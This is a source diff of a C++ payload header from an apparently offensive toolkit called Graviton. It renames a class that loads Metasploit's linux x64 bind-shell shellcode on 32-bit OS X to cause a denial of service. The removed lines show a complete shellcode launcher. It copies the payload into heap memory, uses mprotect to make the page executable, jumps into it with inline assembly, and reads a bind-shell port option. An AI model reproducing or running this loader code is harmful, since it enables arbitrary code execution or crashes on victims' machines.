@@ -19,63 +19,63 @@
  * You should have received a copy of the GNU General Public License
  * along with Graviton.  If not, see http://www.gnu.org/licenses/.
  *
- * @brief Payload_Osx32_DoS
+ * @brief OSX_DoS_32
  *
 */
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-#ifndef _GVN_PAYLOAD_OSX32_DOS_HEAD_
-#define _GVN_PAYLOAD_OSX32_DOS_HEAD_
+#ifndef _GVN_OSX_DoS_32_HEAD_
+#define _GVN_OSX_DoS_32_HEAD_
 
-#include "../gvn_payload.hpp"
+#include <payload/payload.hpp>
 
 #include <cstdio>
 #include <cstdlib>
 #include <sys/mman.h>
 #include <errno.h>
 
-using namespace GraVitoN;
+namespace GraVitoN
+{
+
+namespace Payload
+{
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
 /**
  * @brief OSX 32 bit DoS Shell
  *
- * Loads a linux x64 bshell!
+ * Loading a linux x64 bind shell on OSX x86 means DoS
  * Successfully tested on 10.6.
  * 
  * @see Payload_Sample
  */
-class Payload_Osx32_DoS : public GraVitoN::Bin_Payload
+class OSX_DoS_32 : public Payload::Binary_Payload
 {
 protected:
 	virtual bool initPayload();
 	
 public:
-    Payload_Osx32_DoS();
-    virtual ~Payload_Osx32_DoS();
+    OSX_DoS_32();
+    virtual ~OSX_DoS_32();
 
-    virtual bool initialize ( const string &_options );
-    virtual bool run();
+    virtual bool initialize ();
 };
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-Payload_Osx32_DoS::Payload_Osx32_DoS()
+OSX_DoS_32::OSX_DoS_32()
 {
     jumper = _null_;
 }
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-Payload_Osx32_DoS::~Payload_Osx32_DoS()
+OSX_DoS_32::~OSX_DoS_32()
 {
     delete payload;
 }
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-bool Payload_Osx32_DoS::initPayload()
+bool OSX_DoS_32::initPayload()
 {
-   int port = 4444;
-   OptParser::getValueAsInt(options, "PORT", port);
-
 	/*
 	* linux/x64/shell/bind_tcp - 78 bytes (stage 1)
 	* http://www.metasploit.com
@@ -102,50 +102,15 @@ bool Payload_Osx32_DoS::initPayload()
 }
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-bool Payload_Osx32_DoS::initialize ( const string &_options )
+bool OSX_DoS_32::initialize ()
 {
-    options = _options;
-
-    Logger::logIt ( "init payload... " );
+    Core::Logger::logIt ( "init payload... " );
     initPayload();
-    Logger::logItLn ( "done" );
-
-    jumper = ( void ( * ) ( void* ) ) malloc ( payload_size );
-    memcpy ( ( void* ) jumper, ( void * ) payload, payload_size * sizeof ( unsigned char ) );
+    Core::Logger::logItLn ( "done" );
 
     return true;
 }
 
-//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-bool Payload_Osx32_DoS::run()
-{
-    // Set Page Permissions
-    unsigned long page = ( unsigned long ) jumper & ~ ( unsigned long ) ( getpagesize() - 1 );
-    if ( mprotect ( ( unsigned char* ) page, getpagesize(), PROT_READ | PROT_WRITE | PROT_EXEC ) ) {
-        Logger::logIt ( "mprotect failed - errorno: " );
-        Logger::logItLn ( errno );
-
-        return false;
-    }
-
-    // A Little Delay!
-    int _delay = 320;
-    while ( _delay > 0 ) {
-        --_delay;
-    }
-
-    int useless_out = 0;
-    Logger::logItLn ( "Jumping..." );
-    asm (
-        "mov %1, %%ecx;"
-        "jmp *%%ecx;"
-        : "=r" ( useless_out )
-        : "r" ( jumper )
-        : "%ecx"
-    );
-    Logger::logItLn ( "call > done" );
-
-    return true;
 }
-
-#endif // _GVN_PAYLOAD_OSX32_DOS_HEAD_
+}
+#endif // _GVN_OSX_DoS_32_HEAD_
